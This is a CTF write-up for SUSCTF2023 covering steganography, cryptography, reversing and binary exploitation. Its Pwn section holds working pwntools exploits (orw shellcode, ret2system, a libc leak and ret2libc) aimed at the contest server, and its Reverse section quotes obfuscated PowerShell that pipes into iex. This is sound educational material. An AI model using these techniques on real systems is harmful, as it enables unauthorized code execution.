# SUSCTF2023-东南大学校赛WriteUp


# Misc

## 0x01 旺旺的课程表

首先根据提示《死亡之链》和图片中的时间信息猜测是夏多密码。

根据表中的数字判断总共16个钟表，然后根据每个数字所在的位置的时间画上时针，如下图所示：

![](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015172714979.png)

![](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015172714979.png)

![](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015172734532.png)

按照夏多密码的解密方法旋转和对表，结果是CYBERSECRURITY。

![](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/aHR0cHM6Ly9hLjMzaXEuY29tL3VwbG9hZC8xNy8wMy8yNi9fdGh1bWJzL2JpZy8xNDkwNTE0NjQyMTk5NS5qcGchMzMuanBn)

但是直接交上去flag并不对，这时候想到图片隐写。

先用Binwalk跑一遍发现没有结果。（zlib很可能是png自己的数据）

![](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015173113612.png)

这时想到LSB隐写。于是使用StegSolve打开，左右调节信道，发现二维码：

![image-20231015173314881](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015173314881.png)

扫描得到结果是：

`vigenere:T29tAGSCf2KaZAXeBkylQrsiw3MhR3PocagnRqWrEhX5JYS4PHVlRFGnHb04LFZlPKTlANV3HcSbKHVyEB0uCXpaboShCJTycQEtBETffB4`

根据提示，使用维吉尼亚密码解密，密钥就是cybersecurity。

解得：`R29vZCBKb2IgISEgZmxhZzogc3VzY3RmezcwZmUxNzE5LWU4ODEtNDMwZi04NDBkLTBhYTE3ZjUzMGRhMX0sIGhhdmUgYSBuaWNlIGRheX4`

疑似Base编码，于是用base64解得flag：

![](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015173618903.png)

## 0x02 SUSTV

发现歌曲的最后一段时间有"嘀嘀嘀"的声响。

根据提示（SUSTV），使用MMSSTV，将音频使用虚拟声卡读入：

![image-20231015174303853](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015174303853.png)

得到二维码，扫描得到flag：

Are you a HAM? susctf{b7c55a86-56f4-4ebe-ba57-03d3cae609ea}

## 0x03  Do_u_know_Jeremiah_Denton?

尝试Mp3Stego、摩斯码、频谱、LSB（只支持wav）无解后，找到一种private_bit隐写方法（还是根据题目中醒目的private）。

原理是，mp3文件格式中有很多mf数组，每个数组中都有一个字段是private_bit，使private_bit为0或1可以使mp3携带额外信息。

![image-20231015175026095](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015175026095.png)

观察mp3文件，发现mf数组从CCh处开始，但是发现mf[0]的长度异常，于是选择从mf[1]开始，也就是0x19c。

发现每个mf的大小并不相同（1a1h和1a2h），发现其中的padding_bit字段是否为1决定了mf的大小：

![image-20231015175303102](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015175303102.png)

此时计算出padding_bit和private_bit的位置即可。padding前的比特数是12+1+2+1+4+2=22，也就是padding在第23位，private_bit在第24位。那么扔掉每个mf元素的前两个字节，取第三个字节的倒数第一、第二位分别是private_bit和padding_bit。

由于有padding的值，我们不需要计算没个mf元素的地址，只需要从第一个开始加上每个元素的大小即可偏移到后一个mf元素上去。

exp:

```python
import re
n = 0x19c + 2
result = ''
number = 0
file = open('QueenCard.mp3', 'rb')
l = []
while n < 0x2711a0:
    file.seek(n, 0)
    head = file.read(1)
    padding = '{:08b}'.format(ord(head))[-2]
    result += '{:08b}'.format(ord(head))[-1]
    if padding == "0":
        n += 0x1a1
    else:
        n += 0x1a2
    file.seek(n, 0)

#print(result)
flag = ''
textArr = re.findall('.{' + str(8) + '}', result)

for i in textArr:
    flag = flag + chr(int(i, 2)).strip('\n')
print(flag)
```

这里开始的n加2是因为要扔掉前两个字符。最后使用正则表达式确定flag的位置。结果如下：

![image-20231015180844689](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015180844689.png)

## 0x04 百团（改）

首先扫描二维码发现unicode加密内容，解密后为当铺密码：`士人 大土 大人 中口 中人 人工 夫羊 中田 夫夫 人人 人由 天人 人口 中人 王大 中口 夫大`

使用脚本解密后，发现是16进制对应的ascii码：

```python
dh = '田口由中人工大土士王夫井羊壮天'
ds = '001234555678996'

cip = '士人 大土 大人 中口 中人 人工 夫羊 中田 夫夫 人人 人由 天人 人口 中人 王大 中口 夫大'
s = ''
for i in cip:
	if i in dh:
		s += ds[dh.index(i)]
	else:
		s += ' '
print(s)
# 53 55 53 20 23 34 79 20 77 33 31 63 30 23 65 20 75
```

解密后为：SUS #4y w31c0#e u

此时直接交上去是不对的，于是考虑png隐写。

使用010打开发现png结尾有PK头，于是给foremost解密：

```bash
foremost half.png
```

生成的output文件夹如下：![image-20231015181749492](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015181749492.png)

直接解压zip，发现需要密码。

![image-20231015181932693](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015181932693.png)

能想到的只有SUS #4y w31c0#e u，填入解得另一半flag：

![image-20231015182025272](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015182025272.png)

flag为：

```
susctf{SUS #4y w31c0#e u_join us!}
```

## 0x05 Can_u_find_meeeeee?

猜测藏匿了字符串。

使用everything软件，进入题目所在文件夹，填入`content:sus`，等待一会儿，发现：

![image-20231015182457002](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015182457002.png)

根据题目can u find me，答案可能在.me中。打开后搜索susctf，找到：

![image-20231015182622146](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015182622146.png)

但是感觉内容不大对劲，有点像base加密。解密后得：

![image-20231015182726169](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015182726169.png)

加上susctf{}即为答案。

## 0x06 AI-keras.Model.summary()

首先用010看一下文件，

![image-20231015183036819](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015183036819.png)

发现头部是HDF，于是使用HDFView打开：

![image-20231015183246330](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015183246330.png)

这里显示是乱的，整理了好久，发现010中也能找到：

![image-20231015183526739](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015183526739.png)

flag为：

```
susctf{have_fun_with_deep_conv_net}
```

## 0x07 算术！

![image-20231016114244509](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231016114244509.png)

根据算术编码的过程进行解码：

给定概率是：0.438875

第一次在第一个区间，于是第一个字母是a。

将第一个区间等比例扩大到1，分段为：0-0.25-0.4-0.4- 0.5

发现在第三个区间，第二个字母为l。

将第三个区间等比例扩大到1，分段为：0.4 -0.425-0.44-0.445-0.45

发现在第2个区间，第三个字母为o。

将第二个区间等比例扩大到1，前三段分段为：0.425-0.4325-0.437-0.4385

此时已经确定第四个字母是h（0.4388 > 0.4385）

最后一个个字符所在区间为下一级的第一个区间：

0.4385-0.44425，即为a。

综上：flag为susctf{aloha}

# Crypto

## 0x01 Signin

这题如果直接尝试求D的话会发现e和phi并不互质。

但是这里发现e和q-1是互质的，同时我们知道，在c不是p或q的倍数的情况下：

```
m = c ^ d mod n
==>
m = c ^ d mod p
m = c ^ d mod q
```

于是可以这样求明文：

```python
d = invert(e,q-1)
m = pow(c,d,q)
```

exp：

```python
from Crypto.Util.number import *
import gmpy2

n= 9348930722233673602747870627922536632051931596830523021029470658344207945872450281637991502010865592065129583919444366705749206472328965457544194442473293260282452962070450562945560992589541332260234314736143038686897312913015783450737566433863829005429013314715550324440987242308148777081086560034599304327276652495664906244483122716702510872815412012108241078407548981547499209568327923277655224418476652760666165437469372395064298306123072763746852926480684491336990072974216874092110132242942354893729766833447395903884939906128031153138078686954738158738122774175286616882470456680443125446990462174128736465953
p= 95431874379056800461403445259355958387935856539457670356425515125991917830328568828651972541785162951577004360304248342910123051926823651602627402589646024807536428315338522607471890339989927938359121629376992700732961416640785761545967337504840306704525353304962963873393034684793837634498279771086870629657
q= n // p
c= 2246036184444567567139073961602298811002867470924696340632417536051794476792542719198116728236389022205886961611385905721428355981777782491582241568750536095813788750549170634252878325493396177232015086791252718288335539964125540101137052418937458875590436560115053061583109071488227920631582248047316093668301944870541017960236149831753450428112948744535859225066815666438374524191008471870502946582680908206282283571535153495358730331708125759496753890033345593289838781343364514965520605445715679520747672054689364311522070297101994310182740630464848831706608828051625089849355043315933834771158390525688604165661
e= 31531

phi = (q-1)
print(gmpy2.gcd(e,phi))
d = gmpy2.invert(e,phi)
m = pow(c,d,q)
print(long_to_bytes(m))
```

答案为：

![image-20231015190926432](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015190926432.png)

## 0x02 Vigenere

根据题目，得知是维吉尼亚密码：

```python
import re
from secret import flag, key

assert re.match(r"^susctf\{[0-9a-f]{8}-([0-9a-f]{4}-){3}[0-9a-f]{12}\}$", flag)
assert re.match(r"^[a-z]{10}$", key)

def encrypt(msg, key):
    key, msg = key.lower(), msg.lower()
    res = ""
    k_i = 0
    for i in range(len(msg)):
        if not msg[i].isalpha():
            res += msg[i]
            continue
        c = msg[i]
        k = key[k_i % len(key)]
        res += chr((ord(c) + ord(k) - 2 * ord('a')) % 26 + ord('a'))	#维吉尼亚密码
        k_i += 1
    return res

print(encrypt(flag, key))

'''
ieplnp{bhtnr6m3-04bm-41w3-lg78-c040377ys146}
'''
```

通过和维吉尼亚密码表对照，得知前六位是`qkxjuk`

![img](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/15745722093571.png)

接着发现题目以正则表达式的形式给出了flag的形式，同时知道密码是10位小写字母，那么我们就可以爆破后四位密码（每次用flag的正则检查即可）。

exp:

```python
import re

def decrypt(encrypted_flag, key):
    key, encrypted_flag = key.lower(), encrypted_flag.lower()
    decrypted_flag = ""
    k_i = 0
    for i in range(len(encrypted_flag)):
        if not encrypted_flag[i].isalpha():
            decrypted_flag += encrypted_flag[i]
            continue
        c = encrypted_flag[i]
        k = key[k_i % len(key)]
        decrypted_flag += chr((ord(c) - ord(k) + 26) % 26 + ord('a'))
        k_i += 1
    return decrypted_flag

known_key_prefix = "qkxjuk"
encrypted_flag = "ieplnp{bhtnr6m3-04bm-41w3-lg78-c040377ys146}"
flag_regex = re.compile(r"^susctf\{[0-9a-f]{8}-([0-9a-f]{4}-){3}[0-9a-f]{12}\}$")

for i in range(26):
    for j in range(26):
        for k in range(26):
            for l in range(26):
                possible_key = known_key_prefix + chr(97 + i) + chr(97 + j) + chr(97 + k) + chr(97 + l)
                decrypted_flag = decrypt(encrypted_flag, possible_key)

                if flag_regex.match(decrypted_flag):
                    print(f"Found a matching key: {possible_key}")
                    print(f"Decrypted flag: {decrypted_flag}")
```

结果为：

![image-20231015191937007](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015191937007.png)

## 0x03 ezMath

根据(https://math.stackexchange.com/questions/402537/find-integer-in-the-form-fracabc-fracbca-fraccab)中的讨论，发现当且仅当n为偶数的时候有解。

这里给出了n <= 10的所有整数解，这里直接使用N=10的情况：

```
n=10:

a=221855981602380704196804518854316541759883857932028285581812549404634844243737502744011549757448453135493556098964216532950604590733853450272184987603430882682754171300742698179931849310347;

b=269103113846520710198086599018316928810831097261381335767926880507079911347095440987749703663156874995907158014866846058485318408629957749519665987782327830143454337518378955846463785600977;

c=4862378745380642626737318101484977637219057323564658907686653339599714454790559130946320953938197181210525554039710122136086190642013402927952831079021210585653078786813279351784906397934209.

log2(a+b+c)≈630.265; log10(a+b+c)≈189.729
```

填入后就得到flag：

![image-20231015194336621](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015194336621.png)

# Pwn

## 0x01 orw

根据题目，大概能猜出是orw类型的题目（只能使用open、read和write）。先checksec：

![image-20231015200748364](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015200748364.png)

只开了Canary，同时发现栈上可以RWX，于是考虑将shellcode直接写入栈上。

ida64打开，第一眼就看到了沙箱：

![image-20231015200904346](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015200904346.png)

再看看溢出点：

![image-20231015200928477](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015200928477.png)

发现直接read了0x100，但是buf在rbp上0x80，可以直接栈溢出。

同时发现最后直接call rax，而rax是buf的地址。那我们这里直接将shellcode读入buf就可以执行。下面是open read write的代码：

```assembly
   #open /flag
   push 0x67616c66
    mov rdi,rsp
    xor esi,esi
    push 2
    pop rax
    syscall
   #read(rax,rsp,100h)
    mov rdi,rax
    mov rsi,rsp
    mov edx,0x100
    xor eax,eax
    syscall
   #write(1,rsp,100h)
    mov edi,1
    mov rsi,rsp
    push 1
    pop rax
    syscall
```

直接发送shellcode即可。

exp：

```python
from ae64 import AE64
from pwn import *
context.arch='amd64'
context.os='linux'


shellcode = asm('''
    push 0x67616c66
    mov rdi,rsp
    xor esi,esi
    push 2
    pop rax
    syscall
    mov rdi,rax
    mov rsi,rsp
    mov edx,0x100
    xor eax,eax
    syscall
    mov edi,1
    mov rsi,rsp
    push 1
    pop rax
    syscall
    ''')

r = remote('game.ctf.seusus.com',28380)
#gdb.attach(r)
r.recvuntil(b'shellcode:')

r.send(shellcode)

r.interactive()
```

## 0x02 random

![image-20231015202030014](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015202030014.png)

发现保护全开，一看就不像是栈溢出的题目。

ida64，发现：

![image-20231015202136006](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015202136006.png)

我们只需要得到v5，再和-889275714求异或即可。

发现v5是一个随机数，但是它甚至没有设置种子，那么我们只需要和题目链接到同一个libc中，取出rand()的结果就可以。

如何取出rand()，当然是用ctypes，可以直接使用C语言中的函数，我们取出rand后将其和-889275714异或后发送即可（由于没设种子，这题可以不用pwntool）

exp:

```python
from pwn import *
from ctypes import *

context.terminal = ['tmux','splitw','-h']
context(arch = 'amd64', os = 'linux')
context.log_level='debug'
elf = ELF('./random')
libc = cdll.LoadLibrary('libc.so.6')
r = remote('game.ctf.seusus.com',32552)
#r = elf.process()

v5 = libc.rand()
r.recvuntil(b'mind?')
res = v5 ^ -889275714
r.sendline(str(res))

r.interactive()
```

## 0x03 bof

> buffer overflow

首先checksec：

![image-20231015202641500](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015202641500.png)

只开了栈不可执行，没什么特别的。

ida进，发现溢出点：

![image-20231015202820656](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015202820656.png)

非常朴实无华，这时候就去找函数了，发现有system也有/bin/sh，于是直接ret2system了。这里64位要注意参数放在rdi里，还有栈平衡的问题。

栈平衡很简单，在ROP链前面加上一个ret就行了，rdi的话得去ROPgadget：

![image-20231015203536561](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015203536561.png)

找到了。这里顺便把ret的地址记一下，栈平衡的时候要用。

exp:

```python
from pwn import *

context.terminal = ['tmux','splitw','-h']
context(arch = 'amd64', os = 'linux')
context.log_level='debug'
elf = ELF('./bof')

r = remote('game.ctf.seusus.com',29689)
#r = elf.process()

system = elf.sym['system']
bin_sh = 0x601048
pop_rdi = 0x400793
ret = 0x40053e

#溢出0x20 + 8
payload = cyclic(0x28) + p64(ret) + p64(pop_rdi) + p64(bin_sh) + p64(system)
r.recvuntil(b'Say something?\n')
r.send(payload)

r.interactive()
```

## 0x04 ezROP

checksec看一下：

![image-20231015203906560](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015203906560.png)

开了栈不可执行，但是是32位的（好久没看到32位的题目了）

开ida，发现溢出函数：

![image-20231015204038605](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015204038605.png)

这里直接运行会多出一个wrong，因为wrong!和Say something: 是连着的。不过没有什么影响。

这里read了100h字节，存在栈溢出。但是system和/bin/sh都没有找到。

那么思路就很清楚了，由于write执行过一次，根据lazy binding的机制可以直接使用write打印出GOT表中write的真实地址。通过这个真实地址就可以找到libc的版本。再减去Libc中write的offset就可以得到libc的基址，那么加上system和/bin/sh的偏移，就可以getshell。

这里我选择手动查询Libc地址。首先连接远程泄露write的地址：

```python
r= remote('game.ctf.seusus.com',46494)

write_plt = elf.plt['write']
write_got = elf.got['write']
vul = 0x804850c

payload = cyclic(0x6c + 4) + p32(write_plt) + p32(vul) + p32(1) + p32(write_got) + p32(4)
r.recvuntil(b'wrong')
r.send(payload)

leak = u32(r.recv(4))
info(hex(leak))
```

得到的结果是:

![image-20231015211516925](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015211516925.png)

然后使用libc database search，找到对应的两个库文件：

![image-20231015211550081](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015211550081.png)

（经过尝试，第二个是正确的库文件）

这里将write，system和bin_sh的地址直接记下来计算真实地址：

```python
libc_base = leak - 0x0e57f0
system_addr = libc_base + 0x03cf10
bin_sh_addr = libc_base + 0x17b9db

payload = cyclic(0x6c + 4) + p32(system_addr) + b'a' * 4 + p32(bin_sh_addr)
r.recvuntil(b'wrong')
r.send(payload)

r.interactive()
```

成功getshell：

![image-20231015211813600](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015211813600.png)

完整的exp:

```python
from pwn import *

context(arch='i386',os='linux')
context.log_level = 'debug'
elf = ELF('./ezROP')
libc = ELF('/lib/i386-linux-gnu/libc.so.6')

#r = elf.process()
r= remote('game.ctf.seusus.com',46494)

write_plt = elf.plt['write']
write_got = elf.got['write']
vul = 0x804850c

payload = cyclic(0x6c + 4) + p32(write_plt) + p32(vul) + p32(1) + p32(write_got) + p32(4)
r.recvuntil(b'wrong')
r.send(payload)

leak = u32(r.recv(4))
info(hex(leak))

libc_base = leak - 0x0e57f0
system_addr = libc_base + 0x03cf10
bin_sh_addr = libc_base + 0x17b9db

payload = cyclic(0x6c + 4) + p32(system_addr) + b'a' * 4 + p32(bin_sh_addr)
r.recvuntil(b'wrong')
r.send(payload)

r.interactive()
```

# Reverse

## 0x01 signin

首先查壳，发现32位无壳。

![image-20231015214520917](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015214520917.png)

使用ida打开，如下图所示：

![image-20231015214640210](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015214640210.png)

发现输入的是32位字符串（应该就是flag）。加密的逻辑很简单：先将**除了最后一位**的每一位和下一位进行异或，然后每隔两位将其和后半段的对应字符交换（直接说的话太抽象了，但是代码很好看明白）。

于是，解密的逻辑直接反着来就行。先交换，因为再用同样的办法交换一次就可以交换回原位置，所有交换的代码不用改动。接下来异或。这里我们发现由于加密是`buf[i] = buf[i] ^ buf[i + 1]`，buf的最后一位并没有被操作过，那么要得到原来的`buf[i]`，就得**从最后一位**向前用buf[i+1]和buf[i]异或。

将41f000处的32个字符进行解密即可。依据上面的思路，代码如下所示：

```c++
#include <iostream>
using namespace std;


char a[] = {0x6c,0x41,0x1,0x3,0x26,0x68,0x41,0x59,0x39,0x6a,0x42,0x4,0x26,0x6b,0x45,0x31,0x44,0x7,0x7,0x4c,0x68,0x2d,0x5f,0x6c,0x4,0x56,0x6e,0x2d,0x6a,0x49,0x5a,0x75};
int main() {
    for (int i = 0;i < 16;i+=2) {
        char tmp = a[i];
        a[i] = a[i+16];
        a[i+16] = tmp;
    }

    for (int i = 31;i > 0;i--) {
        a[i-1] = a[i] ^ a[i-1];
    }

    for (int i = 0;i < 32;i++)
        cout << a[i];

    return 0;
}
```

结果如下：

![image-20231015215713651](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015215713651.png)

## 0x02 babyPowerShell

```powershell
('w'+("{0}{1}" -f 'yes','us')+'c'+'tf'+'{Pow'+("{1}{0}{2}" -f'shel','er','l')+'_'+'i'+("{0}{1}"-f'sss','s')+'ss'+("{2}{0}{1}" -f 's','sss_v','ss')+("{1}{2}{0}"-f '_ez_f','err','y')+'o'+'rrr'+'r'+'rr'+'r'+'r_you}'+("{1}{0}" -f 'zZRout','wye')+("{0}{1}"-f'-nul','l')).REPLAce('zZR',[StRing][CHAR]124).REPLAce(([CHAR]119+[CHAR]121+[CHAR]101),[StRing][CHAR]34)|.( $EnV:COMsPEC[4,26,25]-JoiN'')
```

![image-20231015225956403](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015225956403.png)

这里发现最后的管道符连接着一个( $EnV:COMsPEC[4,26,25]-JoiN'')，经过直接执行后发现是iex命令。查看资料和发现，iex会直接将输入当作命令执行。因此我们看不到字符的输出。这里我们需要将其去掉，去掉之后，为了输出后面的字符（应该很容易看出来前面是字符的加加减减），在开头加入`write-output`再执行脚本。

```powerline
write-output ('w'+("{0}{1}" -f 'yes','us')+'c'+'tf'+'{Pow'+("{1}{0}{2}" -f'shel','er','l')+'_'+'i'+("{0}{1}"-f'sss','s')+'ss'+("{2}{0}{1}" -f 's','sss_v','ss')+("{1}{2}{0}"-f '_ez_f','err','y')+'o'+'rrr'+'r'+'rr'+'r'+'r_you}'+("{1}{0}" -f 'zZRout','wye')+("{0}{1}"-f'-nul','l')).REPLAce('zZR',[StRing][CHAR]124).REPLAce(([CHAR]119+[CHAR]121+[CHAR]101),[StRing][CHAR]34)
```

执行结果如下：

![image-20231015232050608](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015232050608.png)

开始时没发现这个out-null哈哈哈似乎也需要去掉，但是还好不影响输出答案。

## 0x03 PowerShell

这题就复杂多了。只能从能入手的地方入手（题目太长，不放进来了）

![image-20231015232610521](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015232610521.png)

首先从开头的地方就可以发现两个加密：一个是Base64，一个是deflatestream。虽然第二个加密不太了解，但是发现cyberchef上有相应的解密过程。

接着就是一大堆加密后的文字。在文件最后还有这些命令：

```powershell
[IO.comPResSIoN.coMpReSsiONmoDe]::DeComPrESs )| %{New-ObjEct  Io.StrEamreadEr( $_ ,[SysTem.Text.ENcODiNg]::AsCIi)}).ReadtOEND( ) |&((gV '*MDr*').nAME[3,11,2]-JoIn'')
```

这里只看出来是ascii加密，还有一个iex，前面的不清楚有什么用处。反正iex要删掉的，我决定先去看看加密的地方有什么。

```test
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